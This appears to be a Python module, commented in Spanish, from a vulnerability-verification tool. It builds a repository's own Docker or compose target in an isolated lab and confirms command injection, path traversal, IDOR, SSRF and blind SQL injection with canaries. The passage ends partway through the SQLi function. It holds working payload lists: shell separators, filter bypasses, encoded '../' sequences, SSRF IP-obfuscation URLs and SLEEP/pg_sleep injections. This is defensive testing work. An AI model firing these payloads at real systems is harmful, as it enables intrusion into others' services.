"""Verificacion dinamica CMS-AGNOSTICA: cuando el objetivo no es WordPress/Drupal/Joomla (un
repo cualquiera que trae su PROPIO Dockerfile o docker-compose.yml), binoracle no se rinde --
construye y arranca ESE Dockerfile/compose tal cual, en una red/entorno aislado propio, y
verifica contra el contenedor real resultante, con la misma disciplina de prueba dura (nunca
`verified=True` por un codigo de estado, siempre por una confirmacion independiente) que
wpverify.py/drupalverify.py/joomlaverify.py.

Esto es deliberadamente mas limitado que los verificadores CMS-especificos: no hay login/sesion
de por medio (no hay un flujo de autenticacion generico que valga para cualquier stack), asi que
solo cubre clases de vulnerabilidad que no lo necesitan -- de momento, command injection via un
canario de fichero (igual de valido en Python/Node/Go/PHP/Java: todos escriben a disco igual) --
y se amplia poco a poco."""
from __future__ import annotations

import os
import re
import subprocess
import time
from typing import Callable, List, Optional

from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _ID_HINTS, _PATH_HINTS, _REDIRECT_HINTS,
                       _SQLI_HINTS, _URL_HINTS, _XML_HINTS, _XSS_HINTS, _XssBrowserSession,
                       _docker_daemon_ok, _http_request, _lab_host, _pick_param,
                       _redirect_location_is_external, _run, _token, configure_burp_mcp)
from .payload_kb import (load_command_injection_separators, load_open_redirect_templates,
                         load_ssti_arithmetic_payloads, load_xss_payloads)
import secrets

_COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")

# configure_burp_mcp/_http_request viven en wpverify.py (ver ahi) -- UN SOLO estado compartido
# por TODOS los verificadores (genericos y CMS-especificos), no una copia por modulo. Se
# reexportan aqui (import de arriba) para no romper el `from .genericverify import
# configure_burp_mcp` que cli.py/web.py ya usaban.

_CI_HINTS = ("cmd", "command", "exec", "run", "host", "ip", "address", "target", "ping",
             "domain", "url", "path", "file", "name", "query", "search", "input")


def _find_build_target(source_dir: str) -> Optional[dict]:
    """Busca, en el codigo YA descargado, como arrancar el objetivo -- un docker-compose.yml/
    compose.yml (en la raiz o un nivel por debajo, el sitio donde casi todo el mundo lo pone), o
    si no hay, un Dockerfile suelto. Devuelve None si no hay ninguna de las dos formas: sin eso,
    no hay nada que montar sin adivinar el stack a ciegas."""
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        for name in _COMPOSE_NAMES:
            if name in files:
                return {"kind": "compose", "path": os.path.join(root, name), "context": root}
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        if "Dockerfile" in files:
            return {"kind": "dockerfile", "path": os.path.join(root, "Dockerfile"), "context": root}
    return None


def _exposed_ports_from_dockerfile(path: str) -> List[int]:
    ports: List[int] = []
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                m = re.match(r"\s*EXPOSE\s+([0-9 ]+)", line, re.IGNORECASE)
                if m:
                    ports.extend(int(p) for p in m.group(1).split() if p.isdigit())
    except OSError:
        pass
    return ports


# puertos comunes para cuando el Dockerfile no declara EXPOSE (pasa mas de lo que parece) -- los
# que de verdad usan por defecto Flask/Django/Express/Rails/Spring/ASP.NET/PHP-FPM+nginx/etc.
_COMMON_PORTS = [80, 8080, 3000, 5000, 8000, 4000, 8888, 9000, 4200, 1337]


class _GenericLab:
    """Analogo generico de _Lab (wpverify.py), pero el contenido del contenedor es el que trae
    el propio repo -- no hay imagen base fija ni sabemos de antemano el stack."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-genverify-{tag}"
        self.container = f"binoracle-genverify-{tag}-app"
        self.image = f"binoracle-genverify-{tag}:latest"
        self.compose_project = f"binoracle-genverify-{tag}"
        self.kind = ""
        self._created: List[str] = []

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def build_and_run(self, target: dict, timeout_build=600.0, timeout_run=60.0):
        self.kind = target["kind"]
        if self.kind == "dockerfile":
            r = self.sh("build", "-t", self.image, "-f", target["path"], target["context"],
                       timeout=timeout_build)
            if r.returncode != 0:
                return r
            self.sh("network", "create", self.net, timeout=30)
            self._created.append(("network", self.net))
            self._created.append(("image", self.image))
            r = self.sh("run", "-d", "--name", self.container, "--network", self.net, "-P",
                       self.image, timeout=timeout_run)
            if r.returncode == 0:
                self._created.append(("container", self.container))
            return r
        else:
            env = dict(os.environ, COMPOSE_PROJECT_NAME=self.compose_project)
            r = subprocess.run(["docker", "compose", "-f", target["path"], "-p",
                                self.compose_project, "up", "-d", "--build"],
                               cwd=target["context"], env=env, capture_output=True, text=True,
                               timeout=timeout_build)
            self._created.append(("compose", target["path"]))
            return r

    def running_containers(self, timeout=15.0) -> List[str]:
        if self.kind == "dockerfile":
            return [self.container]
        r = self.sh("ps", "-a", "--filter", f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Names}}", timeout=timeout)
        return [n for n in (r.stdout or "").splitlines() if n.strip()]

    def published_ports(self, container: str, timeout=15.0) -> List[str]:
        """Puertos del HOST publicados para `container` (sea `docker run -P` o los `ports:` del
        compose) -- `docker port` los lista sin tener que adivinar ni parsear YAML."""
        r = self.sh("port", container, timeout=timeout)
        ports = []
        for line in (r.stdout or "").splitlines():
            m = re.search(r":(\d+)\s*$", line.strip())
            if m:
                ports.append(m.group(1))
        return ports

    def discover_http(self, tries: int = 60, delay: float = 3.0) -> Optional[tuple]:
        """Prueba TODOS los puertos publicados de TODOS los contenedores levantados hasta que uno
        responda HTTP (status < 500) -- sin asumir cual de los contenedores del compose es el
        servidor web ni en que puerto escucha. Devuelve (container, port) o None.

        urlopen() LANZA HTTPError para cualquier respuesta 4xx/5xx en vez de devolverla (solo los
        2xx/3xx llegan al `with` de abajo) -- confirmado en vivo que, sin capturarla aparte, un
        objetivo que solo expone rutas POST (su raiz responde 404/501, no 2xx) nunca se detectaba
        como 'listo' aunque estuviera arriba de verdad. Una URLError (sin respuesta HTTP en
        absoluto -- conexion rechazada, nombre no resuelto) si sigue significando 'aun no'."""
        import urllib.error
        import urllib.request
        host = _lab_host()
        for _ in range(tries):
            for c in self.running_containers():
                for port in self.published_ports(c):
                    try:
                        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=4) as r:
                            if r.status < 500:
                                return (c, port)
                    except urllib.error.HTTPError as e:
                        if e.code < 500:
                            return (c, port)
                    except Exception:
                        continue
            time.sleep(delay)
        return None

    def logs_tail(self, name: str, lines: int = 40) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def read_file(self, container: str, path: str, timeout=10.0) -> str:
        r = self.sh("exec", container, "sh", "-c", f"cat {path} 2>/dev/null", timeout=timeout)
        return r.stdout or ""

    def write_canary(self, container: str, path: str, content: str, timeout=15.0) -> bool:
        """Analogo de _Lab.write_canary (wpverify.py): planta un fichero DENTRO del contenedor
        real del objetivo (via `docker exec`, no en ningun volumen compartido -- aqui no sabemos
        de antemano si existe uno) para confirmar path-traversal/LFI de verdad."""
        r = self.sh("exec", "-i", container, "sh", "-c", f"cat > {path}",
                   input_text=content, timeout=timeout)
        return r.returncode == 0

    def resolve_network(self, timeout=15.0) -> Optional[str]:
        """Red Docker del laboratorio -- para `dockerfile` ya la creamos nosotros (self.net); para
        `compose`, docker compose crea la suya propia (convencion `<proyecto>_default`, pero no
        hay que confiar en la convencion: se busca por la etiqueta real que compose pone en toda
        red que crea)."""
        if self.kind == "dockerfile":
            return self.net
        r = self.sh("network", "ls", "--filter",
                   f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Name}}", timeout=timeout)
        names = [n for n in (r.stdout or "").splitlines() if n.strip()]
        return names[0] if names else None

    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
        """Analogo de _Lab.start_listener: un contenedor Alpine en la MISMA red del laboratorio
        que solo escucha TCP/8080 y vuelca cualquier conexion entrante -- sirve para confirmar
        SSRF generico igual que en WordPress: si el objetivo hace de verdad una peticion saliente
        hacia aqui, queda grabada con el token unico que iba en la ruta."""
        net = self.resolve_network(timeout=timeout)
        if not net:
            return None
        self.listener = f"binoracle-genverify-{self.tag}-ssrf"
        r = self.sh("run", "-d", "--name", self.listener, "--network", net, _ALPINE_IMAGE,
                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
                   timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        return self.listener

    def listener_log(self, timeout: float = 10.0) -> str:
        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else ""

    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
        """IP interna real del contenedor `name` en la red del laboratorio -- para las variantes
        de SSRF que apuntan al listener por IP (decimal/hex/octal) en vez de por nombre."""
        net = self.resolve_network(timeout=timeout)
        if not net:
            return None
        r = self.sh("inspect", "-f",
                   f"{{{{(index .NetworkSettings.Networks \"{net}\").IPAddress}}}}",
                   name, timeout=timeout)
        ip = (r.stdout or "").strip()
        return ip or None

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "image":
                    self.sh("rmi", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "compose":
                    subprocess.run(["docker", "compose", "-f", name, "-p", self.compose_project,
                                    "down", "-v"], capture_output=True, timeout=60)
            except Exception:
                pass


def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
                           budget_s: float) -> Optional[tuple]:
    """Pasos comunes a TODOS los verificadores genericos: detectar como arrancar el objetivo,
    construirlo/arrancarlo, y encontrar por donde habla HTTP. Devuelve (lab, base_url, container)
    o None con `res` ya relleno (detail/logs/limitations) -- el caller solo tiene que `return res`."""
    target = _find_build_target(source_dir)
    if target is None:
        res.detail = "no se encontro Dockerfile ni docker-compose.yml en el codigo descargado"
        res.limitations.append("la verificacion generica SOLO puede montar un objetivo que "
                               "traiga su propio Dockerfile/docker-compose.yml -- sin eso no "
                               "hay forma de arrancarlo sin adivinar el stack")
        return None
    step(f"objetivo generico detectado: {target['kind']} en {target['path']}")

    lab = _GenericLab(_token())
    step("construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
    r = lab.build_and_run(target)
    if r.returncode != 0:
        res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:500]}"
        lab.teardown()
        return None

    step("esperando a que el objetivo responda HTTP en alguno de sus puertos publicados...")
    found_http = lab.discover_http()
    if found_http is None:
        res.detail = "el objetivo arranco pero ningun puerto publicado respondio HTTP a tiempo"
        for c in lab.running_containers():
            res.logs.append(f"docker logs ({c}):\n" + lab.logs_tail(c))
        lab.teardown()
        return None
    container, port = found_http
    base_url = f"http://{_lab_host()}:{port}"
    step(f"objetivo arriba: {base_url} (contenedor '{container}')")
    return (lab, base_url, container)


def verify_generic_command_injection(
    source_dir: str, endpoint: str, http_method: str, parameters,
    cmd_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Verifica OS command injection contra CUALQUIER objetivo que traiga su propio Dockerfile/
    docker-compose.yml, sin asumir el stack (Python/Node/Go/PHP/Java/Ruby... todos escriben a
    disco igual, asi que el canario de fichero via `docker exec` sirve siempre). No hay login de
    por medio -- esta clase, a diferencia de missing-authorization o account-takeover, no lo
    necesita para probarse."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_ci_{_token()}.txt"
        m = (http_method or "POST").upper()
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "canary_path": canary_path, "canary_secret": secret})

        # separadores reales de command injection (sh/bash/dash/ash) -- casuistica de
        # Command Injection/Intruder/command_exec.txt en PayloadsAllTheThings: los separadores
        # estandar (; | || && salto de linea), sustitucion de comandos (funciona aunque el valor
        # ya este entre comillas/concatenado), rotura de contexto de comillas, y bypass de
        # filtro de espacios via ${IFS}/%09 (comun cuando el codigo bloquea el caracter espacio
        # pero no el separador de comando).
        payload_forms = [
            f"; echo {secret} > {canary_path}",
            f"| echo {secret} > {canary_path}",
            f"|| echo {secret} > {canary_path}",
            f"&& echo {secret} > {canary_path}",
            f"\necho {secret} > {canary_path}\n",
            f"`echo {secret} > {canary_path}`",
            f"$(echo {secret} > {canary_path})",
            f"' ; echo {secret} > {canary_path} ; '",
            f'" ; echo {secret} > {canary_path} ; "',
            f";echo${{IFS}}{secret}>{canary_path}",
            f";echo%09{secret}>{canary_path}",
        ]
        # ademas de las anteriores, los separadores PUROS (sin comando incrustado, ver
        # payload_kb.load_command_injection_separators) de command_exec.txt que todavia no estan
        # arriba -- & solo y %0a%0d (CRLF).
        for sep in load_command_injection_separators():
            if sep in ("&", "%0a%0d"):
                payload_forms.append(f"{sep} echo {secret} > {canary_path}")
        candidate_params = [cmd_param_hint] if cmd_param_hint else (
            list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or []))
        if not candidate_params:
            candidate_params = [_pick_param(parameters, _CI_HINTS) or "input"]

        tried = []
        found = False
        for pname in candidate_params:
            if found:
                break
            for form in payload_forms:
                payload = dict(parameters) if isinstance(parameters, dict) else {}
                payload[pname] = form
                try:
                    _http_request(m, base_url + endpoint, timeout=15,
                                     data=payload if m != "GET" else None,
                                     params=payload if m == "GET" else None)
                except Exception as e:
                    tried.append({"parametro": pname, "error": str(e)})
                    continue
                time.sleep(1)
                content = lab.read_file(container, canary_path)
                present = secret in content
                tried.append({"parametro": pname, "payload": form, "secreto_presente": present})
                if present:
                    found = True
                    res.evidence["parametro_ganador"] = pname
                    res.evidence["payload_ganador"] = form
                    step(f"VERIFICADO: {canary_path} dentro del contenedor contiene el secreto "
                         f"exacto tras inyectar via '{pname}' -- el comando se ejecuto de verdad.")
                    break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"COMMAND INJECTION confirmada: el payload en el parametro "
                          f"'{res.evidence['parametro_ganador']}' hizo que {canary_path} "
                          f"apareciera DENTRO del contenedor con el secreto exacto -- prueba "
                          f"inequivoca de ejecucion de comandos, no una deduccion por status code")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de parametro/forma de "
                          f"inyeccion contra {endpoint} pero ninguna hizo aparecer el canario -- "
                          f"no se confirmo command injection (puede que el endpoint/parametro no "
                          f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_path_traversal(
    source_dir: str, endpoint: str, http_method: str, parameters,
    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
    canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
    fuera de cualquier directorio de la app) y prueba las mismas variantes de profundidad/
    codificacion de '../' -- el mecanismo de prueba (leer un fichero del propio sistema de
    ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                               "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
                               "mano (path_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor del objetivo)...")
        if not lab.write_canary(container, canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        m = (http_method or "GET").upper()
        rel = canary_path.lstrip("/")
        depths = (2, 4, 6, 8, 10, 12)
        attempts = [rel, canary_path]
        attempts += [("../" * n) + rel for n in depths]
        attempts += [("..%2f" * n) + rel for n in depths]
        attempts += [("%2e%2e%2f" * n) + rel for n in depths]
        attempts += [("%252e%252e%252f" * n) + rel for n in depths]
        attempts += [("..\\" * n) + rel for n in depths]
        attempts += [("....//" * n) + rel for n in depths]
        attempts += [rel + "%00", canary_path + "%00"]

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "path_param": path_param, "canary_path": canary_path,
                             "canary_secret": secret})

        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[path_param] = payload_value
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            present = secret in (resp.text or "")
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "secreto_presente": present})
            if present:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                     f"{path_param}={payload_value!r}.")
                break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
                          f"plantado en {canary_path} (dentro del contenedor del objetivo)")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
                          f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
                          f"(puede necesitar otra profundidad/codificacion, o el "
                          f"endpoint/parametro no son los reales)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_idor(
    source_dir: str, endpoint: str, http_method: str, parameters,
    id_param_hint: str = "", own_id: str = "1", victim_id: str = "2",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
) -> WpVerifyResult:
    """Version DELIBERADAMENTE MAS DEBIL del IDOR que verify_wordpress_account_takeover y
    similares confirman en WordPress/Drupal/Joomla: aqui NO hay ningun flujo de login generico
    (no hay forma de autenticar contra un stack arbitrario sin conocerlo), asi que esto no puede
    demostrar "un usuario sin permiso accede al recurso de otro" -- solo "pedir el mismo
    endpoint con dos IDs distintos, SIN SESION, devuelve contenido realmente distinto para cada
    uno (no solo un generico 403/404 igual para ambos)". Eso es una senal real de que el ID se
    usa para resolver un recurso concreto sin mas comprobacion visible desde fuera, pero es
    MUCHO mas floja que una confirmacion con dos cuentas reales -- `res.verified` nunca se pone
    a True aqui, solo `res.ok`, precisamente para no igualar ambos niveles de prueba en el
    informe. Pensado para CVEs IDOR en codigo que no es WordPress/Drupal/Joomla pero trae su
    propio Dockerfile/docker-compose.yml (ver _bootstrap_generic_lab)."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    if not id_param:
        res.detail = "no se identifico el parametro que lleva el ID del recurso"
        res.limitations.append("la verificacion de IDOR necesita saber que parametro lleva el "
                               "ID del recurso; afina 'parameters' o pasalo a mano "
                               "(id_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "id_param": id_param, "own_id": own_id,
                             "victim_id": victim_id})
        res.limitations.append(
            "esta verificacion generica NO usa ninguna sesion autenticada (no hay forma de "
            "iniciar sesion contra un stack arbitrario sin conocerlo de antemano) -- solo "
            "compara dos respuestas SIN login, nunca confirma que un usuario sin permiso "
            "accede al recurso de OTRO usuario concreto. Es una prueba REAL pero deliberadamente "
            "mas debil que la de WordPress/Drupal/Joomla (que SI usa dos cuentas reales); nunca "
            "se marca 'verificado' con esto, solo se deja constancia de la diferencia observada")

        def req(id_value):
            payload = dict(base_params)
            payload[id_param] = id_value
            return _http_request(m, base_url + endpoint, timeout=15,
                                 data=payload if m != "GET" else None,
                                 params=payload if m == "GET" else None)

        try:
            resp_own = req(own_id)
            resp_victim = req(victim_id)
        except Exception as e:
            res.detail = f"la peticion de comparacion fallo: {e}"
            return res

        own_text, victim_text = (resp_own.text or ""), (resp_victim.text or "")
        res.evidence["status_propio"] = resp_own.status_code
        res.evidence["status_victima"] = resp_victim.status_code
        res.evidence["respuesta_propia_recorte"] = own_text[:300]
        res.evidence["respuesta_victima_recorte"] = victim_text[:300]

        both_ok = resp_own.status_code < 400 and resp_victim.status_code < 400
        differs = own_text != victim_text and len(victim_text) > 20
        res.ok = True
        if both_ok and differs:
            res.evidence["diferencia_observada"] = True
            res.detail = (f"DIFERENCIA REAL observada (prueba mas debil, SIN sesion): "
                          f"{id_param}={own_id!r} y {id_param}={victim_id!r} devolvieron "
                          f"contenido DISTINTO, ambos con status < 400 -- indicio de que el ID "
                          f"resuelve un recurso concreto sin mas comprobacion visible desde "
                          f"fuera. Esto NO confirma el impacto real de un IDOR (eso exige dos "
                          f"cuentas reales con y sin permiso); solo que el servidor distingue "
                          f"entre IDs sin rechazar ninguno")
            step(f"diferencia real observada entre {id_param}={own_id!r} y {id_param}="
                 f"{victim_id!r} (prueba mas debil, sin sesion)")
        else:
            res.evidence["diferencia_observada"] = False
            res.detail = (f"{id_param}={own_id!r} (status {resp_own.status_code}) y "
                          f"{id_param}={victim_id!r} (status {resp_victim.status_code}) no "
                          f"mostraron una diferencia real -- el IDOR no se confirmo (puede "
                          f"necesitar otro endpoint/parametro, o ambos IDs estan igualmente "
                          f"bloqueados/permitidos)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_ssrf(
    source_dir: str, endpoint: str, http_method: str, parameters,
    url_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_ssrf: levanta un contenedor 'callback' en la MISMA
    red del laboratorio generico (sea `dockerfile` o `compose` -- ver _GenericLab.resolve_network)
    y prueba las mismas variantes de URL/codificacion para confirmar que el SERVIDOR del objetivo
    (no el navegador del atacante) hace de verdad la peticion saliente."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
    if not url_param:
        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
                               "URL remota; afina 'parameters' o pasalo a mano (url_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
        listener = lab.start_listener()
        if not listener:
            res.detail = "no se pudo levantar el contenedor listener para SSRF"
            return res

        listener_ip = lab.container_ip(lab.listener)
        m = (http_method or "GET").upper()
        found = False
        tried = []

        def build_urls(tok: str) -> List[str]:
            path = f"binoracle-ssrf-{tok}"
            urls = [f"http://{lab.listener}:8080/{path}"]
            if listener_ip:
                parts = [int(x) for x in listener_ip.split(".")]
                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                octip = "0" + ".".join(f"{x:03o}" for x in parts)
                urls += [
                    f"http://{listener_ip}:8080/{path}",
                    f"http://{dec}:8080/{path}",
                    f"http://{hexip}:8080/{path}",
                    f"http://{octip}:8080/{path}",
                    f"http://trusted-host@{listener_ip}:8080/{path}",
                    f"http://{listener_ip}:8080@evil.invalid/{path}",
                    f"http://{lab.listener}.:8080/{path}",
                ]
            return urls

        for attempt_url in build_urls(_token()):
            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[url_param] = attempt_url
            entry = {"url": attempt_url, "token": token}
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
                entry["status"] = resp.status_code
            except Exception as e:
                entry["peticion_error"] = str(e)
            time.sleep(2)
            log = lab.listener_log()
            entry["token_en_log"] = token in log
            tried.append(entry)
            if token in log:
                found = True
                res.evidence["callback_url_ganadora"] = attempt_url
                res.evidence["token_ganador"] = token
                res.evidence["listener_log_recorte"] = log[:1000]
                break

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "url_param": url_param, "listener_ip": listener_ip,
                             "metodo": m, "intentos": tried})

        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
                          f"laboratorio) recibio una conexion con el token exacto tras la "
                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                          f"navegador del atacante")
            step(f"VERIFICADO: el listener interno recibio el token "
                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
                          f"que el endpoint/parametro no sean los reales, o que el servidor "
                          f"filtre de verdad las URLs internas antes de seguirlas)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


# SLEEP() (MySQL/MariaDB/SQLite con create_function propio), pg_sleep() (PostgreSQL) -- el motor
# real no se puede saber sin leer el codigo, asi que se prueban los dos dialectos en vez de
# asumir uno. Si el motor real no tiene ninguno de los dos, el payload simplemente no ejecuta
# nada y la peticion tarda lo normal (no es un falso positivo).
_SQLI_SLEEP_SECONDS = 4.0
_SQLI_SLEEP_EXPRS = (f"SLEEP({_SQLI_SLEEP_SECONDS:.0f})", f"pg_sleep({_SQLI_SLEEP_SECONDS:.0f})")
_SQLI_CONTEXTS = ("", "'", '"', "')", '")')
_SQLI_COMMENTS = ("-- -", "#")


def verify_generic_sqli_blind(
    source_dir: str, endpoint: str, http_method: str, parameters,
    sqli_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
    Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
    ser MySQL/Postgres/SQLite/MSSQL/Mongo...), el error-based (extractvalue/updatexml, sintaxis
    de MySQL) y el UNION-based (depende del numero de columnas Y de que el motor soporte UNION
    igual) no generalizan sin arriesgar falsos positivos/negativos por motor equivocado -- el
    retraso de una funcion SLEEP es la unica senal que vale casi igual en cualquier SQL.

    Prueba dura contra falsos positivos por jitter de red/Docker: toma la MEDIANA de 2 peticiones
    de control (sin inyeccion) como linea base, y solo marca `verified=True` si el payload
    produce un retraso consistente (>= la mitad del SLEEP pedido) en las 2 repeticiones
    independientes de la MISMA peticion, no en una sola medida que podria ser ruido."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
    if not sqli_param:
        res.detail = "no se identifico el parametro a inyectar"
        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
                               "'parameters' o pasalo a mano (sqli_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
